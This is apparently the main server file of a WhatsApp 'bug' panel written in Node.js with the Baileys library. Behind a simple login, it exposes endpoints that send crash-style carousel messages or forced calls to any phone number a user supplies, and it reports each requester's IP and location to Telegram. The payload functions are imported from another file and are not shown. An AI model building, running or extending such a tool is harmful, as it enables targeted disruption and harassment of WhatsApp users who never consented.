console.clear();  
require('./settings/config')
console.log('starting...');  
process.on("uncaughtException", console.error);  
  
const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap   
} = require("@whiskeysockets/baileys");  
  
const pino = require('pino');  
const readline = require("readline");  
const fs = require('fs');  
const express = require("express");  
const session = require("express-session")
const bodyParser = require('body-parser');  
const cors = require("cors");  
const path = require("path");    
  
const app = express();  
const PORT = process.env.PORT || 5036

const { carousels2, forceCall } = require('./public/service/bugs')
const { getRequest, sendTele } = require('./public/engine/myfunc')
const users = require('./public/json/user.json')

app.enable("trust proxy");  
app.set("json spaces", 2);  
app.use(cors());  
app.use(express.urlencoded({   
  extended: true   
}));  
app.use(express.json());  
app.use(express.static(path.join(__dirname, "public")));  
app.use(bodyParser.raw({   
  limit: '50mb',   
  type: '*/*'   
}));  

app.use(session({
    secret: 'penis-kyuurzy',
    resave: false,
    saveUninitialized: true,
    cookie: {
        maxAge: 60 * 60 * 1000
    }
}));

const { Boom } = require('@hapi/boom');
const {
    smsg,
    sleep,  
    getBuffer
} = require('./start/lib/myfunction');
const usePairingCode = true;  

const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,   
        output: process.stdout   
    })
    return new Promise((resolve) => {  
        rl.question(text, resolve)   
    });  
}

async function clientstart() {
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(`./session`)
    const client = makeWASocket({
        version: [2, 3000, 1015901307],
        logger: pino({
            level: "silent"   
        }),  
        printQRInTerminal: false,  
        auth: state,  
        connectTimeoutMs: 60000,  
        defaultQueryTimeoutMs: 0,  
        keepAliveIntervalMs: 10000,  
        emitOwnEvents: true,  
        fireInitQueries: true,  
        generateHighQualityLinkPreview: true,  
        syncFullHistory: true,  
        markOnlineOnConnect: true,  
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });  
      
    if (!client.authState.creds.registered) {
        const phoneNumber = await question('please enter your WhatsApp number, starting with 62:\n> ');  
        const code = await client.requestPairingCode(phoneNumber, "LAURINEX");  
        console.log(`your pairing code: ${code}`);  
    }
  
    const store = makeInMemoryStore({  
        logger: pino().child({   
            level: 'silent',  
            stream: 'store'   
        })   
    });  
      
    store.bind(client.ev);
    
    //router
    app.post('/api/login', (req, res) => {
        const { username, password } = req.body;
        const user = users.find(u => u.username === username && u.password === password);
        if (!user) return res.status(401).json({
            status: false,
            message: "Username atau password salah."
        });
        
        req.session.user = {
            username: user.username
        }
        
        res.json({
            status: true, 
            message: "Login berhasil",
            user: {
                username: user.username
            }
        });
    });
    
    app.get('/api/bug/carousels', async (req, res) => {
        const { target, fjids } = req.query;
        if (!target) return res.status(400).json({
            status: false, 
            message: "parameter target diperlukan"
        });
        if (!fjids) return res.status(400).json({
            status: false,  
            message: "parameter fjids diperlukan"
        });  
        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")
        
        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)
        try {
            await carousels2(client, cuki, fjids)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
        console.log(`successfully sent carousels to number ${cuki}`)        
        const penis = `
#! — latest request info details
            
 ▢ Target: ${target}
 ▢ Fjids: ${fjids}
 ▢ IP: ${info.ip}
 ▢ Lokasi: ${info.location}
 ▢ User-Agent: ${info.userAgent}
 ▢ Method: ${info.method}
 ▢ URL: ${info.url}
 ▢ Query: \`${info.query}\`
 ▢ Waktu: ${info.timestamp}

${global.watermark}`
            sendTele(penis)
        } catch (error) {
            console.error(error);
            res.status(500).json({
                status: false,
                error: error.message
            });
        }
    });  
    
    app.get('/api/bug/forcecall', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({
            status: false,  
            message: "parameter target diperlukan"
        });
        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.status(400).json({
            status: false,
            message: "gunakan awalan kode negara!"
        })
        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)
        try {
            await forceCall(client, cuki)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
        console.log(`successfully sent forcecall to number ${cuki}`)
        const penis = `
#! — latest request info details
            
 ▢ Target: ${target}
 ▢ IP: ${info.ip}
 ▢ Lokasi: ${info.location}
 ▢ User-Agent: ${info.userAgent}
 ▢ Method: ${info.method}
 ▢ URL: ${info.url}
 ▢ Query: \`${info.query}\`
 ▢ Waktu: ${info.timestamp}

${global.watermark}`
            sendTele(penis)
        } catch (error) {
            console.error(error);
            res.status(500).json({
                status: false,
                error: error.message
            });
        }
    });  
    
    client.ev.on("messages.upsert", async (chatUpdate, msg) => {  
        try {  
            const mek = chatUpdate.messages[0]  
            if (!mek.message) return  
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message  
            if (mek.key && mek.key.remoteJid === 'status@broadcast') return  
            if (!client.public && !mek.key.fromMe && chatUpdate.type === 'notify') return  
            if (mek.key.id.startsWith('KyuuRzy-') && mek.key.id.length === 20) return  
            if (mek.key.id.startsWith('FatihArridho_')) return;  
            const m = smsg(client, mek, store)  
            require("./start/kyuubeyours")(client, m, chatUpdate, store)  
        } catch (err) {  
            console.log(err)  
        }  
    });  
  
    client.decodeJid = (jid) => {  
        if (!jid) return jid;  
        if (/:\d+@/gi.test(jid)) {  
            let decode = jidDecode(jid) || {};  
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;  
        } else return jid;  
    };  
  
    client.ev.on('contacts.update', update => {  
        for (let contact of update) {  
            let id = client.decodeJid(contact.id);  
            if (store && store.contacts) store.contacts[id] = {  
                id,  
                name: contact.notify  
            };  
        }  
    });  
  
    client.public = false  
    
    client.ev.on('connection.update', (update) => {
        const { konek } = require('./start/lib/connection/connect')
        konek({ 
            client, 
            update, 
            clientstart,
            DisconnectReason,
            Boom
        })  
    })  
    
    client.ev.on('creds.update', saveCreds);  
    return client;
}

clientstart()

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, './public/login.html'));
});

app.get('/dashboard', (req, res) => {
    if (!req.session.user) return res.redirect('/')
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {  
  console.log(`server running on port http://localhost:${PORT}`);  
});  

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {  
  require('fs').unwatchFile(file)  
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')  
  delete require.cache[file]  
  require(file)  
})  
